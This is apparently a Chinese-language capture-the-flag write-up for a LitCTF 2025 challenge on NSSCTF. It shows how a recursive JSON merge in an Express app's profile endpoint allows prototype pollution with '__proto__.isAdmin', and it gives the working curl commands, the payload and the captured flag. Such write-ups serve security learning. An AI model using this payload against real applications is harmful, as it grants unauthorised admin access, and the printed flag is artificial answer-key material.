---
type: source
created: 2026-05-10
updated: 2026-05-10
related: []
---

# [LitCTF 2025] 多重宇宙日记 (NSSCTF)

Express 应用，用户设置接口用递归 merge 合并用户 JSON，`__proto__.isAdmin=true` 一发污染即成管理员，访问 obscure admin path 拿 flag。

涉及概念：[[concepts/prototype-pollution-isadmin-merge]]
涉及实体：[[entities/ctf_nssctf]]
相关：[[concepts/prototype-pollution-ejs-outputfunctionname]]（另一种 prototype pollution gadget）

## 挑战

`http://node6.anna.nssctf.cn:22281/`，Express（响应头 `X-Powered-By: Express`），connect.sid session。首页提示 "管理员拥有一把能够解锁宇宙终极秘密的钥匙，藏在管理员的专属控制面板里"。

## 强信号清单

个人资料页 `/api/profile` 自带三个"明示提示"：

1. `<pre id="currentSettings">{}</pre>` —— settings 是一个对象
2. **"高级/测试区域"**：一个 `<textarea>` 直接发 raw JSON 到 `/api/profile/update`
3. 前端 JS 两次写注释 `// 刷新页面以更新导航栏（如果isAdmin状态改变）` —— 导航栏会根据 `isAdmin` 条件渲染

这三条合起来就是 "merge 用户 JSON + 依据 isAdmin 渲染"，典型 prototype pollution。

## 利用

前端正常提交结构：

```json
{"settings": {"theme": "dark", "language": "zh"}}
```

服务端对 `req.body.settings` 做递归 merge 合进 session user settings。在 settings 下挂 `__proto__`：

```json
{"settings": {"__proto__": {"isAdmin": true}}}
```

```bash
URL=http://node6.anna.nssctf.cn:22281

curl -s -c cookies.txt -X POST "$URL/auth/register" \
  --data-urlencode "username=t1" --data-urlencode "password=t1"

curl -s -b cookies.txt -X POST "$URL/api/profile/update" \
  -H "Content-Type: application/json" \
  -d '{"settings":{"__proto__":{"isAdmin":true}}}'
# {"message":"个人资料更新成功","settings":{}}   ← 看着啥都没合进去

curl -s -b cookies.txt "$URL/api/profile" | grep 管理员面板
# | <a href="/secure_admin_area/flag_panel" ...>管理员面板</a>

curl -s -b cookies.txt "$URL/secure_admin_area/flag_panel" | grep NSSCTF
# <p class="flag" ...>NSSCTF{9dd4c3bc-90cd-401d-ba18-b2c47bcc63b2}</p>
```

## Flag

```
NSSCTF{9dd4c3bc-90cd-401d-ba18-b2c47bcc63b2}
```

## 踩坑

1. **层级要对**：payload 必须和前端正常结构对齐（`{"settings":{...}}`），在 settings 里放 `__proto__`。单层 `{"__proto__":...}` 不会被 merge 到目标对象。
2. **`settings:{}` 不代表失败**：返回的 "settings" 只展示白名单字段（theme/language），`__proto__` 不被当成 settings 的一部分回显。副作用已发生。
3. **admin path 不在常规字典里**：`/admin` `/dashboard` 全 404；真实是 `/secure_admin_area/flag_panel`，得先污染让导航栏渲染出来才看得到。
